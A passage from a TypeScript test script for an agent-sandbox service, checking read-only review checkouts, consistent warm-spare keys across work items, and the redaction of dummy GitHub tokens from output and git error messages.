	const missing = await box.run(reviewCheckoutScript(".", base));
	expect(
		"another existing commit cannot stand in for the pull head",
		missing.exitCode !== 0 && missing.stdout.includes("wlp:missing"),
	);
	expect("review leaves every remote ref unchanged", before === refs());
}

await section("review checkout: pinned setup, exact pull ref, detached clean workspace and read-only remote", () =>
	verifyReviewCheckout(localSandbox("review-checkout")),
);

await section("spare recipe: consecutive single work items on the same base", async () => {
	const { readyRecipe } = await import("../server/src/actors/agent-session.js");
	const { sessionSandboxInput } = await import("../server/src/actors/internal.js");
	const { digest } = await import("../server/src/sandbox/snapshot-key.js");
	const { machineLayer } = await import("../server/src/sandbox/runner-layer.js");
	const repo = stored(open, acme),
		uid = "u_bo",
		machineId = "m_0123456789abcdef";
	const c = {
		client: () => ({
			user: {
				get: () => ({
					internalGithubConnection: async () => boConnection,
					internalSetupCommand: async () => ({ command: "make deps", updatedAt: 123 }),
				}),
			},
			workItem: { get: () => ({ internalSetupSeed: async () => null }) },
		}),
	};
	const keys: string[] = [];
	for (const item of ["a", "b"]) {
		const sessionId = "s_" + item;
		const meta = {
			uid,
			sessionId,
			repo,
			repoUrl: repo.url,
			harness: "windlass",
			profile: "docker-windlass-sandbox",
			origin: { kind: "item", role: "builder", itemId: "i_" + item },
			publishBranch: "windlass/item-" + item,
		} as const;
		const sandboxes = machineLayer(
			{
				who: { uid, sessionId, machineId },
				facts: async () => ({
					report: { gitMirrors: true, warmSpares: { ready: keys.length } },
				}),
				again: async (name: string, args: import("../server/src/runner/protocol.js").Args<"create">) => {
					assert.equal(name, "create");
					assert.equal(args.mirrorRepo, String(repo.id));
					assert.ok(args.spare?.connected);
					assert.equal(args.spare.connected.commit, standin.branchHead(open, repo.branch));
					keys.push(digest([args.spare]));
					return sessionId;
				},
			} as never,
			{} as import("../server/src/sandbox/api.js").SandboxLayer,
		).sandboxes;
		await sandboxes.create({
			...sessionSandboxInput(meta),
			mirrorRepo: String(repo.id),
			spareRecipe: ready =>
				readyRecipe(
					c as never,
					meta as never,
					{ opened: [], unopened: [] } as never,
					null,
					ready ? "claim" : "seed",
					() => app,
				),
		});
	}
	assert.equal(keys.length, 2);
	expect("both authorized create requests carry the same ready key", keys[0] === keys[1]);
});

await section("secrets: nothing that was printed or thrown holds one", async () => {
	const tokens = [...standin.tokens.keys()];
	const secrets = [standin.clientSecret, process.env.WLP_SECRET as string, ...tokens];
	const leaked = output.filter(line => secrets.some(secret => line.includes(secret)) || line.includes("PRIVATE KEY"));
	expect(
		`none of ${tokens.length} tokens, nor the client secret, nor the private key is in ${output.length} lines of output`,
		leaked.length === 0,
		leaked[0]?.slice(0, 120),
	);
	const sample = `fatal: unable to access 'https://x-access-token:ghs_${"a".repeat(40)}@github.com/o/r.git/': Authorization: Basic ${Buffer.from("x-access-token:ghs_secretsecretsecretsecret").toString("base64")} ghu_${"b".repeat(36)}`;
	const cleaned = redact(sample, ["ghs_secretsecretsecretsecret"]);
	expect(
		"what git or GitHub says is cleaned of anything shaped like a token before it is shown",
		!/gh[su]_[a-z]{20}/.test(cleaned) &&
			!cleaned.includes(Buffer.from("x-access-token:ghs_secretsecretsecretsecret").toString("base64")),
		cleaned,
	);
});

await standin.stop();
rmSync(scratch, { recursive: true, force: true });
process.exit(tally.summary(true));
